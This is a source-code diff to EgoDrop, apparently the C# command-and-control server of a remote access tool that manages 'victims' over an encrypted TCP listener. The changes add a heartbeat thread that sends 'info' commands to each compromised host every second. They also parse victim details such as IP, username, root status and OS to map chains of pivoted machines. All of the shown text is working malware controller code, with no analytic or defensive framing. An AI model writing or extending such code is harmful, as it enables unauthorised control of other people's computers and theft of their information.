@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Microsoft.Web.WebView2.Core;
+using System;
 using System.Collections.Generic;
 using System.Configuration;
 using System.Data;
@@ -14,6 +15,7 @@ namespace EgoDrop
     {
         private Socket m_sktSrv { get; set; }
         public Dictionary<string, clsVictim> m_dicVictim = new Dictionary<string, clsVictim>();
+        public Dictionary<string, Thread> m_dicHeartbeatThreads = new Dictionary<string, Thread>();
 
         /// <summary>
         /// TCP listener(RSA+AES).
@@ -175,6 +177,25 @@ namespace EgoDrop
                                     if (string.Equals(victim.m_crypto.m_szChallenge, szPlain))
                                     {
                                         victim.fnSendCommand("info");
+
+                                        new Thread(() =>
+                                        {
+                                            while (m_bIsListening)
+                                            {
+                                                try
+                                                {
+                                                    if (!victim.m_sktClnt.Connected || victim.m_sktClnt.SafeHandle == null)
+                                                        break;
+
+                                                    victim.fnSendCommand("info");
+                                                    Thread.Sleep(1000);
+                                                }
+                                                catch
+                                                {
+                                                    break;
+                                                }
+                                            }
+                                        }).Start();
                                     }
                                 }
                             }
@@ -201,17 +222,27 @@ namespace EgoDrop
                                     }
 
                                     string szSrcVictimID = lsVictim.Last();
-                                    fnOnReceivedMessage(victim, szSrcVictimID, lsMsg);
-
-                                    if (lsMsg[0] == "info")
+                                    
+                                    try
                                     {
-                                        szVictimID = szSrcVictimID;
-                                        string szIPv4 = lsMsg[3];
-                                        string szUsername = lsMsg[5];
-                                        bool bRoot = string.Equals(lsMsg[7], "1");
-                                        string szOS = lsMsg[8];
+                                        fnOnReceivedMessage(victim, szSrcVictimID, lsMsg);
 
-                                        fnOnAddChain(lsVictim, szOS, szUsername, bRoot,szIPv4);
+                                        if (lsMsg[0] == "info")
+                                        {
+                                            szVictimID = szSrcVictimID;
+                                            string szIPv4 = lsMsg[3];
+                                            string szUsername = lsMsg[5];
+                                            bool bRoot = string.Equals(lsMsg[7], "1");
+                                            string szOS = lsMsg[8];
+
+                                            var enProtocol = (NetworkView.enConnectionType)Enum.Parse(typeof(NetworkView.enConnectionType), lsMsg.Last());
+
+                                            fnOnAddChain(this, victim, lsVictim, szOS, szUsername, bRoot, szIPv4, enProtocol);
+                                        }
+                                    }
+                                    catch (InvalidOperationException)
+                                    {
+                                        //Do nothing.
                                     }
                                 }
                             }
@@ -225,7 +256,6 @@ namespace EgoDrop
             catch (Exception ex)
             {
                 //Socket sktClnt = victim.m_sktClnt;
-                //MessageBox.Show(ex.Message, "fnBeginRecvCallback()", MessageBoxButtons.OK, MessageBoxIcon.Error);
 
                 fnOnVictimDisconnected(victim, szVictimID);
             }
